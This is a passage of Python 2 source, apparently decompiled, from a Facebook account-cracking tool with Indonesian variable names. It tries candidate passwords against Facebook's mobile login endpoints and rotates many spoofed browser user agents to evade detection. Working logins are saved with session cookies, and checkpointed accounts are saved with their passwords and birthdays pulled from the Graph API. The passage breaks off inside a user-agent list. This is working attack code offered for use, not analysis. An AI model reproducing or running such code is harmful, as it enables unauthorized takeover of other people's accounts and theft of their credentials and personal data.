                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, response.json()['access_token']))
                break
                continue
                continue
            if 'www.facebook.com' in response.json()['error_msg']:
                
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    (month, day, year) = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s  ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s*--> %s \xe2\x97\x8a %s           ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue
                continue
        loop += 1
        rm = random.choice([
            '\x1b[1;91m',
            '\x1b[1;92m',
            '\x1b[1;93m',
            '\x1b[1;94m',
            '\x1b[1;95m',
            '\x1b[1;96m',
            '\x1b[1;97m'])
        for wk in list('\\|-/'):
            (sys.stdout.write('\r' + wk + wk + ' [' + user + '] %s/%s %s%s%s[OK-CP][%s-%s] ' % (len(self.id), loop, warna, warna, warna, len(ok), len(cp))),)
        
        sys.stdout.flush()

    
    def basic(self, user, zona):
        global loop
        
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ua = random.choice([
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
                'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
            headers_ = {
                'Host': 'mbasic.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://mbasic.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers = headers_).text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': user,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            _headers = {
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://mbasic.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G981U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, headers = _headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                kukis = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[LIVE] %s|%s              ' % (H, user, pw)
                print ' %s[COOKIE] %s  ' % (H, kukis)
                ok.append('%s|%s|%s' % (user, pw, kukis))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s|%s|%s\n' % (user, pw, kukis))
                cek_apk(kukis)
                break
                continue
                continue
            if 'checkpoint' in ses.cookies.get_dict():
                
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    (month, day, year) = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CHECK] %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s[CHECK] %s \xe2\x97\x8a %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue
                continue
        loop += 1
        rm = random.choice([
            '\x1b[1;91m',
            '\x1b[1;92m',
            '\x1b[1;93m',
            '\x1b[1;94m',
            '\x1b[1;95m',
            '\x1b[1;96m',
            '\x1b[1;97m'])
        for wk in list('\\|-/'):
            (sys.stdout.write('\r' + wk + wk + ' [' + user + '] %s/%s %s%s%s[OK-CP][%s-%s] ' % (len(self.id), loop, warna, warna, warna, len(ok), len(cp))),)
        
        sys.stdout.flush()

    
    def mobil(self, user, zona):
        global loop
        
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            asu = random.choice([
                'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                'NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400,Mozilla/5.0 (Linux; Android 5.1; en-US; E5533 Build/29.1.B.0.101) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Noki630/1.0 SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400',
                'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
                'NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1',
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352',
                'NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-us; nokiax2-02) U2/1.0.0 UCBrowser/8.7.1.234 U2/1.0.0 Mobile UNTRUSTED/1.0',
                'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0.1; vivo Y53 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/8.6.12.9',
                'Mozilla/5.0 (Linux; Android 8.1; DUA-L22 Build/HONORDUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0.1; SM-G610Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; U; Android 7.0; vi; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; U; Android 5.0; en-US; ASUS_Z00AD Build/LRX21V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/264.0.0.44.111;]',
                'Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/327.0.0.33.120;]',
                'Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-gc',
                'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/48.0.2564.82 Mobile Safari/537.36 Tepi/14.14332',
                'Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; WebBrowser/8.1; IEMobile/11.0; NOKIA; Lumia 525) like Gecko UCBrowser/4.2.1.541 Mobile',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36',
                'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10570',
                'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
                'Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/307.0.0.40.111;]',
                'Mozilla/5.0 (Linux; U; Android 4.1.3; ru-RU; Nokia_X Build/GRK39F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF',
                'Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF]',
                'Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF',
                'Mozilla/5.0 (Linux; Android 6.0; Redmi 4 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF',
                'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g',
                'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Tizen 2.2; SAMSUNG SM-Z9005) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 like Android 4.1; Mobile Safari/537.3',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.3',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.5.6',
                'Mozilla/5.0 (Linux; Android 8.1.0; BBF100-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FB_IAB/FB4A;FBAV/127.0.0.22.69',
                'Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64',
                'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1',
                'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7',
                'Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/537.36 PHX/4.7',
                'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136',
                'Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                'Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3638; U; en) Presto/2.8.119 Version/11.10',
                'SAMSUNG-GT-C3312R Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.32584/144.30; U; en) Presto/2.12.423 Version/12.16',
                'Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-I8200N Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-P5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
                'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414',
                'Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)',
                'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/159.0.0.38.95;]',
                'Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36[FB_IAB/FB4A;FBAV/311.0.0.44.117;]',
                'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1',
                'Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019)[FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; Xperia Z3 Tablet Compact LTE Build/OPM8.190305.001; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.0(20416) Chrome/76.0.3809.111 Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; Xperia Z3 Compact) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692',
                'Mozilla/5.0 (Linux; Android 9; Xperia Z3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]',
                'Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/286.0.0.48.112;]',
                'Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/290.0.0.44.121;]',
